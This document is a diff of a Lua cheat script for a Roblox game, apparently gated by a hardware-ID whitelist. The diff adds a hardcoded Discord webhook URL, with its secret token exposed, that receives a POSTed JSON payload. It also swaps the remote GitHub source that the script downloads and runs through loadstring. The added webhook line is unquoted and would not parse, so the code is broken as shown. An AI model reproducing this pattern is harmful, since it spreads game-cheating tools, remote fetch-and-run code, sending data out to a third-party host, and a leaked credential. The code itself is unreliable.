@@ -5,8 +5,8 @@ local whitelisted_HWIDs = {
     ["620a359fdf83da9fe755e76a58caaeeaacc20db1deefce6e2b5d8b3261d0efb1"] = true,
     ["633989ea636297b4f8c1fd5abdd23c781d5bd638d53e18402e29189959dee976b53132519493a0fb593a9b10a0b608aa"] = true,
     ["c2650acafbc0ee130d950630a295377a18b3b3306022570878f48a0eb93aae583ce92f6380d55904d7ee8cc6facf8621"] = true,
-    [""] = true,
-    [""] = true,
+    ["ea6278d1c065850a1f07a5110bdde6145fe1b882fb284b6372bacef94d4328fb"] = true,
+    ["cc055878be86bb6ce50718468bc241da9142e618b2b8dd633760438fcd98ec73"] = true,
     [""] = true,
     [""] = true,
     [""] = true,
@@ -89,7 +89,7 @@ local payload = {
 
     local success, err = pcall(function()
         req({
-            Url = serverUrl,
+            Url = https://discord.com/api/webhooks/1424135422589796352/_QucbA-YEXQIon8usLdSXACjVktMlx4etq8Ur4znLY8m8mvS2HyrNFJ0Qkf7TK3eMoZx,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode(payload)
@@ -107,7 +107,7 @@ local muscleEvent = Player:WaitForChild("muscleEvent")
 local display = Player.DisplayName
 
 
-local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/LuxuryPCVersion/v2ui//main/eleriumV2", true))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Spectralol/SpectraUI//main/GUISpectra", true))()
 
 local window = library:AddWindow("Spectra | Private access - Hello "..display, {
     main_color = Color3.fromRGB(0, 0, 0),
